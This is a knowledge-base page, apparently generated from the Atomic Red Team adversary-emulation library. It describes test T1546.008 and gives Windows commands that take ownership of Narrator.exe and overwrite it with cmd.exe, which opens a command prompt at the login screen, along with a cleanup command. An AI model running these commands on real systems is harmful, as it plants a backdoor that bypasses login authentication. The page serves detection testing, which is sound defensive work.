---
atomic_guid: "2002f5ea-cd13-4c82-bf73-e46722e5dc5e"
title: "Replace Narrator.exe (Narrator binary) with cmd.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "2002f5ea-cd13-4c82-bf73-e46722e5dc5e"
  - "Replace Narrator.exe (Narrator binary) with cmd.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Replace Narrator.exe (Narrator binary) with cmd.exe

Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen.

## Metadata

- Atomic GUID: 2002f5ea-cd13-4c82-bf73-e46722e5dc5e
- Technique: T1546.008: Event Triggered Execution: Accessibility Features
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.008/T1546.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.008]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Narrator.exe /A
icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
```

### Cleanup

```commandprompt
copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
